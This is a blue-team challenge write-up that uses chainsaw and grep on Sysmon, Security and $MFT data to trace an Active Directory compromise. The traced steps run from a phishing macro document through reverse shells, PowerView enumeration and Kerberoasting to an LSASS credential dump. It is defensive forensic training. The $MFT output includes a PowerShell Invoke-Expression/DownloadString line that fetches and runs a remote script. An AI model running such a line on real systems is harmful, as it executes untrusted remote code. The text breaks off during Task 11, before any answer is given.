You are a blue team analyst tasked with investigating a suspected breach in an Active Directory environment named Main.local. The network includes a Domain Controller (DC01 and two client machines (Client02 and Client03). A user on Client03 received a phishing email, leading to a series of attacks that compromised the domain. Your job is to analyze the provided Windows Event Logs and Sysmon logs from Client02, Client03, and DC01 to reconstruct the attack chain, identify the attacker’s actions, and uncover critical artifacts such as credentials, hashes, and persistence mechanisms.

All right, let's get started on this Blue Team challenge—specifically, SOC.

## TASK 1
First of all, we have 3 directories:
```
❯ ls -l
drwxrwxr-x winter winter 4.0 KB Mon May 26 07:55:24 2025  Logs-Client02
drwxrwxr-x winter winter 4.0 KB Mon May 26 03:38:18 2025  Logs-Client03
drwxrwxr-x winter winter 4.0 KB Mon May 26 04:01:08 2025  Logs-DC
```

And into Logs-Client02 we have:
```
❯ ls -l
drwxrwxr-x winter winter 4.0 KB Mon May 26 03:49:12 2025  C
.rw-rw-r-- winter winter 1.1 MB Sun May 25 15:25:12 2025  Application.evtx
.rw-rw-r-- winter winter 9.1 MB Sun May 25 15:26:24 2025  Powershell.evtx
.rw-rw-r-- winter winter 6.1 MB Sun May 25 15:24:36 2025  Security.evtx
.rw-rw-r-- winter winter 1.1 MB Mon May 26 07:53:54 2025  Sysmon.evtx
```

So let's check the files downloaded by the Client 02 by accessing the C directory:
```
❯ ls -l
.rw-rw-r-- winter winter 426 MB Fri Feb  3 13:16:54 2017  '$MFT'
```

The $MFT file is essentially a database where NTFS stores information about every file and directory on a volume. Every time a file is created, deleted, or moved, the $MFT is updated.

Given that our $MFT is about 500 MB in size, we’ll need to filter and refine the search carefully to get readable results.
So let's use this one-liner:
```
strings '$MFT' | grep -i "Downloads" | less
```

And the results:
```
C:\Users\student\Downloads\Chanllenges]
C:\Users\student\Downloads
Invoke-Expression (New-Object Net.WebClient).DownloadString("https://sec511-extras.s3.amazonaws.com/Win10-update.ps1")
C:\Users\jody\Downloads
C:\Users\jody\Downloads\Profits.docm
Sources: http://downloads.sourceforge.net/freeglut/freeglut/freeglut-2.6.0.tar.gz
Sources: http://downloads.sourceforge.net/libpng/libpng-1.5.2.tar.gz
Homepage: http://www.oracle.com/technetwork/database/berkeleydb/downloads/index.html
Sources: http://mysql.linux.cz/Downloads/MySQL-5.1/mysql-5.1.44.tar.gz
Comment: 32bit libmysql.dll from http://mysql.linux.cz/Downloads/MySQL-5.1/mysql-noinstall-5.1.44-win32.z
Comment: 64bit libmysql.dll from http://mysql.linux.cz/Downloads/MySQL-5.1/mysql-noinstall-5.1.44-winx64.zip
Sources: http://downloads.sourceforge.net/gnuwin32/patch-2.5.9-7-src.zip
Sources: http://downloads.sourceforge.net/giflib/giflib-4.1.6.tar.gz
{"Type":"Common","Name":"Tracing","KeyPath":"Microsoft\\Tracing","ShortDescription":"Tracing Information","LongDescription":"https://www.allthingsdfir.com/tracing-malicious-downloads/","InternalID":"af5c023c-b790-443a-86eb-0205d8dd366d","HiveType":"Software","Category":"Program execution"}
{"Type":"Common","Name":"Wow6432Node - Tracing","KeyPath":"WOW6432Node\\Microsoft\\Tracing","ShortDescription":"Tracing Information","LongDescription":"https://www.allthingsdfir.com/tracing-malicious-downloads/","InternalID":"ab48c472-e5e1-43d3-ba90-69c740c54a4e","HiveType":"Software","Category":"Program execution"}
  <summary>Downloads each available package from the default channel</summary>
and downloads them to current working directory.  Note: only
    <OPTIONS BUILDDIR="\xampp\ppm" CLEAN="1" CONFIRM="1" DOWNLOADSTATUS="16384" FORCEINSTALL="1" IGNORECASE="1" MORE="24
schemes":{},"isDownloadsImprovementsAlreadyMigrated":false,"isSVGXMLAlreadyMigrated":true}
#file:///C:\Users\student\Downloads\
Downloads.LNK=0
#file:///C:\Users\student\Downloads\
04 - Downloads.lnk=@%SystemRoot%\system32\shell32.dll,-21798
```

Watching the results, the most suspicious file is `C:\Users\jody\Downloads\Profits.docm`
There we have the first answer! 
##### Answer: `Profits.docm`

## TASK 2
What is the IP address from which the malicious attachment was downloaded?

Ok so we have the filename, `Profits.docm` and the username, `jody`

We will make a similar search with `strings` and `grep`:
```
strings '$MFT' | grep -C 5 "Profits.docm"
```

And amid all the noise, we can see this:
```
FILE0
#http://192.168.204.152/Profits.docm
UfDP
#http:/
92.168.204.152/Profits.docm
192.168.204.152"
#http://192.168.204.152/Profits.docm
Profits.docmP
en-US
Chrome/136.0.7103.114/WindowsP
#http://192.168.204.152/Profits.docm
192.168.204.152"
WpyBP
WpyBP
FILE0
FILE0
```

And as simple as that we have the answer for the task 2
##### Answer: `192.168.204.152`

## TASK 3
After the victim opened the file the malware initiated a network connections to a remote IP address. What is the IP address and the port number?

Remember this files?
```
❯ ls -l
drwxrwxr-x winter winter 4.0 KB Mon May 26 03:49:12 2025  C
.rw-rw-r-- winter winter 1.1 MB Sun May 25 15:25:12 2025  Application.evtx
.rw-rw-r-- winter winter 9.1 MB Sun May 25 15:26:24 2025  Powershell.evtx
.rw-rw-r-- winter winter 6.1 MB Sun May 25 15:24:36 2025  Security.evtx
.rw-rw-r-- winter winter 1.1 MB Mon May 26 07:53:54 2025  Sysmon.evtx
```

An `.evtx` file is a **Windows XML Event Log** file, which stores binary-formatted logs of system, security, and application events.
In order to read these files we will use `chainsaw`
Since the source was a `.docm` file, the culprit is almost certainly `winword.exe` or a child process such as `powershell.exe`. Let's see which IP addresses those processes are connecting to:
```
❯ chainsaw search -i "winword.exe" Sysmon.evtx --json | jq -r '.[] | select(.Event.System.EventID == 3) | .Event.EventData | "\(.DestinationIp):\(.DestinationPort)"'

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (1.1 MiB)
[+] Searching forensic artefacts...
[+] Found 53 hits
192.168.204.152:4444
```

And there we go! we have an IP `192.168.204.152` and a port, `4444`

##### Answer: `192.168.204.152:4444`

## TASK 4
What is the name of the second-stage payload uploaded to Client02?

Now, we'll look for file creation or download events that occurred immediately after the document was opened.

Let's ask `chainsaw` to show us all the files that were created `(ID 11)` and the process that created them.
```
❯ chainsaw search "powershell.exe" Sysmon.evtx --json | jq -r '.[] | select(.Event.System.EventID == 11) | .Event.EventData.TargetFilename'

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (1.1 MiB)
[+] Searching forensic artefacts...
[+] Found C:\Users\jody\AppData\Local\Temp\__PSScriptPolicyTest_55gcqdpk.2uj.ps1
C:\Users\jody\AppData\Local\Temp\__PSScriptPolicyTest_hfit5vyk.kkv.ps1
C:\Users\jody\Downloads\UpdatePolicy.exe
C:\Users\jody\Downloads\UpdatePolicy.exe
C:\Users\jody\AppData\Local\Temp\__PSScriptPolicyTest_0sjbuygn.uqu.ps1
C:\Users\jody\Downloads\PowerView.ps1
C:\Users\jody\AppData\Local\Temp\__PSScriptPolicyTest_53w4qzcz.kxx.ps1
C:\Users\administrator\AppData\Local\Temp\__PSScriptPolicyTest_f3nz0v3s.puw.ps1
C:\Users\jody\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive
109 hits
```

We have some interesting files here: 
- `UpdatePolicy.exe` is our main candidate to be the answer for the task.
- `PowerView.ps1` is an extremely popular tool from PowerSploit. It is used for active enumeration of Active Directory domains.

##### Answer: `UpdatePolicy.exe`

## TASK 5
What port was used for the reverse shell connection from the second-stage payload on Client02?

For this task, let’s keep a few things in mind. First, the process we want to monitor is UpdatePolicy.exe, and we’re looking for connections. We previously used a command that does exactly that, so we’ll change the process and run it again on the log.
```
❯ chainsaw search -i "UpdatePolicy.exe" Sysmon.evtx --json | jq -r '.[] | select(.Event.System.EventID == 3) | .Event.EventData | "\(.DestinationIp):\(.DestinationPort)"'

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (1.1 MiB)
[+] Searching forensic artefacts...
[+] Found 23 hits
192.168.204.152:1337
192.168.204.152:1337
```

Again, chainsaw gives us an IP `192.168.204.152` and the port `1337`

##### Answer: `1337`

## TASK 6
The attacker subsequently downloaded a tool to enumerate the Active Directory environment. What is the name of this tool?

Wait... we answered it before, right? 
When we executed the command: `chainsaw search "powershell.exe" Sysmon.evtx --json | jq -r '.[] | select(.Event.System.EventID == 11) | .Event.EventData.TargetFilename'`

We saw that the user have a `PowerView.ps1` in the `Downloads` folder, so thats the answer!

##### Answer: `PowerView.ps1`

## TASK 7
What is the username of the targeted service account?

The attacker likely used `PowerView` to list accounts with SPNs. Let's search for the keywords `SPN` or `Get-DomainUser` in the PowerShell logs.

So let's go to Logs-DC and check for event `4769` that means `A Kerberos service ticket was requested`
```
chainsaw search "4769" Security.evtx | grep -E "TargetUserName|ServiceName|TicketEncryptionType" | grep -v "0x12"
```

In real Active Directory environments, 99% of what we see are computer accounts (names ending in **$**) or the `krbtgt` account. But right in the middle of our output, we found the anomaly.
```
ServiceName: sqlsvc
    TicketEncryptionType: '0x17'
    TargetUserName: asmith@MAIN.LOCAL
```

##### Answer: `sqlsvc`

## TASK 8
After acquiring the account credentials, the attacker was able to crack the ticket. When did the attacker first use them to log in? (UTC)

After struggling a bit with that task i asked Gemini for a one-liner to find the exact time of the login.

```
❯ chainsaw dump Security.evtx | grep -B 15 "Status: '0x0'" | grep -B 15 "TargetUserName: sqlsvc" | grep "SystemTime" | head -n 1

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Security.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (3.1 MiB)
[+] Done
      SystemTime: 2025-05-25T04:03:47.041000Z
```

##### Answer: `2025-05-25T04:03:47`

## TASK 9
What is the executable associated with the first service created by a Sysinternals tool on the target system following the attacker's initial login attempt?

```
❯ strings -e l Sysmon.evtx | grep -ioE 'C:\\Windows\\[a-zA-Z0-9_-]+\.exe' | sort -u
C:\Windows\explorer.exe
C:\Windows\Explorer.EXE
C:\Windows\HuygkKUv.exe
C:\Windows\olIUYvbK.exe
C:\Windows\QdNJPZue.exe
C:\Windows\Sysmon64.exe
C:\Windows\VgYTbFEK.exe
```

We have four suspicious executables:
- HuygkKUv.exe
- olIUYvbK.exe
- QdNJPZue.exe
- VgYTbFEK.exe

If the attacker had used the legitimate Microsoft tool (PsExec.exe), we would have seen PSEXESVC.exe.
However, real attackers use a clone of this tool called psexec.py (part of the Impacket suite).
To prevent antivirus software from detecting the signature of the legitimate Microsoft file, psexec.py uploads the executable to C:\Windows\ but generates a random 8-character name for it on each execution attempt.

##### Answer: `VgYTbFEK.exe`

## TASK 10
On Client03, what was the file name of the executable used to dump cleartext credentials from memory?

```
❯ chainsaw dump Sysmon.evtx | grep -B 10 -A 10 -i "lsass.exe" | grep "Image:"

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Sysmon.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (8.1 MiB)
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    ParentImage: C:\Windows\System32\wininit.exe
    SourceImage: C:\Windows\system32\wininit.exe
    TargetImage: C:\Windows\system32\lsass.exe
    SourceImage: C:\Windows\system32\csrss.exe
    TargetImage: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    SourceImage: C:\Windows\Sysmon64.exe
    TargetImage: C:\Windows\system32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    SourceImage: C:\Windows\Sysmon64.exe
    TargetImage: C:\Windows\system32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    SourceImage: C:\Users\jody\Downloads\netdiag.exe
    TargetImage: C:\Windows\system32\lsass.exe
    SourceImage: C:\Users\jody\Downloads\netdiag.exe
    TargetImage: C:\Windows\system32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
[+] Done
    Image: C:\Windows\System32\lsass.exe
    Image: C:\Windows\system32\lsass.exe
    Image: C:\Windows\System32\lsass.exe
❯ 
```

There's quite a bit of noise in this output, but we can see a suspicious file in the `\Downloads` folder
```
SourceImage: C:\Users\jody\Downloads\netdiag.exe
TargetImage: C:\Windows\system32\lsass.exe
```

The executable is located in `C:\Users\jody\Downloads\`. No legitimate Windows administrative tool runs from a regular user's Downloads folder to interact with the system's most critical security process.
`lsass.exe` is the process that manages credentials in Windows. If a process “touches” LSASS, it is most likely attempting to extract plaintext passwords or hashes from memory.

As we can see, the Source is `netdiag.exe` and the Target is `lsass.exe`.

##### Answer: `netdiag.exe`

## TASK 11
What is the username of the account whose cleartext password was found on Client03?

After successfully dumping the memory of the lsass.exe process using the disguised executable netdiag.exe, the attacker was able to extract plaintext credentials stored on the system.
```
❯ chainsaw dump Sysmon.evtx | grep -i "CommandLine:" | grep -ivE "svchost|taskhost|conhost"

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Sysmon.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (8.1 MiB)
    CommandLine: C:\Windows\system32\cmd.exe /c ""C:\Program Files\VMware\VMware Tools\poweroff-vm-default.bat""
    ParentCommandLine: '"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"'
    CommandLine: '%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'
    ParentCommandLine: '\SystemRoot\System32\smss.exe 00000080 00000084 '
    CommandLine: '%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'
    ParentCommandLine: '\SystemRoot\System32\smss.exe 000000f4 00000084 '
    CommandLine: C:\Windows\system32\lsass.exe
    ParentCommandLine: wininit.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: C:\Windows\System32\spoolsv.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
    CommandLine: '"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"'
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: '"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"'
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --wake --system'
    CommandLine: C:\Windows\system32\cmd.exe /c ""C:\Program Files\VMware\VMware Tools\poweron-vm-default.bat""
    ParentCommandLine: '"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-AMFilter.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-AMFilter.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Drivers\WdFilter.sys" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Drivers\WdFilter.sys" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Drivers\WdFilter.sys"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -Embedding
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Windows-Windows Defender.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Windows-Windows Defender.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpEvMsg.dll" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpEvMsg.dll" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpEvMsg.dll"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-Service.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-Service.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpSvc.dll" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpSvc.dll" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpSvc.dll"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-NIS.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-NIS.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\NisSrv.exe" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\NisSrv.exe" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\NisSrv.exe"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-RTP.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-RTP.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpRtp.dll" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpRtp.dll" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpRtp.dll"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-Protection.man"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    CommandLine: C:\Windows\system32\wevtutil.exe install-manifest "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\Microsoft-Antimalware-Protection.man" "/resourceFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpClient.dll" "/messageFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpClient.dll" "/parameterFilePath:C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpClient.dll"
    ParentCommandLine: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe"'
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: '"C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"'
    ParentCommandLine: C:\Windows\system32\services.exe
    ParentCommandLine: C:\Windows\system32\services.exe
    CommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler'
    CommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource core'
    ParentCommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x254,0x258,0x25c,0x250,0x260,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --wake --system'
